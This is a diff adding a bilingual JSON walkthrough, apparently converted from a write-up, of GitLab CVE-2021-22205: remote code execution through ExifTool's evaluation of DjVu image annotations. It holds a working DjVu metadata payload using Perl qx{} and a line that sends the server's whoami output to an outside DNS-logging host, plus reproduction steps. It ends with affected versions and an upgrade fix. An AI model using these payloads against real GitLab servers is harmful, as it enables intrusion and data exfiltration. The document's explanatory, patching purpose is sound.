@@ -1,0 +1,96 @@
+{
+    "_source_md":  "Gitlab/2022-05-18-Gitlab-RCE-with-snippet-function.md",
+    "version":  "gitlab-rce-with-snippet-function",
+    "title":  {
+                  "zh":  "GitLab CVE-2021-22205 通过 Snippet 功能实现远程代码执行",
+                  "en":  "GitLab CVE-2021-22205 RCE via Snippet Function"
+              },
+    "description":  {
+                        "zh":  "利用 GitLab 的 snippet 功能上传恶意图片文件，通过 ExifTool 漏洞实现远程代码执行。",
+                        "en":  "Exploit GitLab snippet function to upload malicious image files and achieve RCE through ExifTool vulnerability."
+                    },
+    "steps":  [
+                  {
+                      "type":  "system_event",
+                      "content":  {
+                                      "zh":  "CVE-2021-22205 漏洞原理：上传图像文件时，GitLab Workhorse 将扩展名为 jpg/jpeg/tiff 的文件传递给 ExifTool 删除未列入白名单的标签。DjVu 格式的注释会被 eval 执行。",
+                                      "en":  "CVE-2021-22205 vulnerability: When uploading image files, GitLab Workhorse passes files with jpg/jpeg/tiff extensions to ExifTool. DjVu format annotations get evaluated."
+                                  },
+                      "annotation":  {
+                                         "zh":  "这是一个严重的 RCE 漏洞，CVSS 评分 10.0",
+                                         "en":  "This is a critical RCE vulnerability, CVSS score 10.0"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "复现步骤：\n1. 登录 GitLab 创建仓库\n2. 创建新的 snippet\n3. 在描述字段点击「Attach a file」\n4. 上传恶意 DjVu 图片 echo_vakzz.jpg\n5. 观察服务器是否创建 /tmp/vakzz 文件",
+                                      "en":  "Reproduction steps:\n1. Login to GitLab and create repository\n2. Create new snippet\n3. Click \u0027Attach a file\u0027 in description\n4. Upload malicious DjVu image echo_vakzz.jpg\n5. Check if /tmp/vakzz file is created"
+                                  },
+                      "annotation":  {
+                                         "zh":  "也可以通过未授权方式实现 RCE",
+                                         "en":  "Can also achieve RCE without authentication"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "qx{ping `whoami`.5pxha.i3ntq7.bnslog.top}",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "func IsExifFile(filename string) bool {\n\tfilenameMatch := regexp.MustCompile(`(?i)\\.(jpg|jpeg|tiff)$`)\n\n\treturn filenameMatch.MatchString(filename)\n}",
+                                             "language":  "go"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "(metadata\n\t(Copyright \"\\\n\" . qx{echo vakzz \u003e/tmp/vakzz} . \\\n\" b \") )",
+                                             "language":  "perl"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "制作恶意 DjVu 图片：编辑图片元数据，添加恶意代码\n(metadata (Copyright \"\\n\" . qx{echo vakzz \u003e/tmp/vakzz} . \" b \"))\n其中 qx{} 用于执行 Perl 命令",
+                                      "en":  "Craft malicious DjVu image: edit image metadata to add malicious code\n(metadata (Copyright \"\\n\" . qx{echo vakzz \u003e/tmp/vakzz} . \" b \"))\nqx{} is used to execute Perl commands"
+                                  },
+                      "annotation":  {
+                                         "zh":  "修改命令即可执行任意操作",
+                                         "en":  "Modify command to execute arbitrary operations"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "content":  {
+                                      "zh":  "漏洞利用成功：服务器上创建了 /tmp/vakzz 文件，证明命令执行成功",
+                                      "en":  "Exploitation successful: /tmp/vakzz file created on server, proving command execution"
+                                  },
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "攻击者可获得服务器 shell 权限",
+                                         "en":  "Attacker can gain shell access on server"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "漏洞总结：\n- GitLab Workhorse 将图片传递给 ExifTool 处理\n- ExifTool 在解析 DjVu 注释时执行代码\n- 通过 snippet 功能上传恶意图片触发漏洞\n- 影响版本：GitLab CE/EE \u003c 13.10.3",
+                                      "en":  "Summary:\n- GitLab Workhorse passes images to ExifTool\n- ExifTool executes code when parsing DjVu annotations\n- Upload malicious image via snippet to trigger vulnerability\n- Affected: GitLab CE/EE \u003c 13.10.3"
+                                  },
+                      "annotation":  {
+                                         "zh":  "修复建议：升级 GitLab 至安全版本",
+                                         "en":  "Fix: Upgrade GitLab to secure version"
+                                     }
+                  }
+              ]
+}
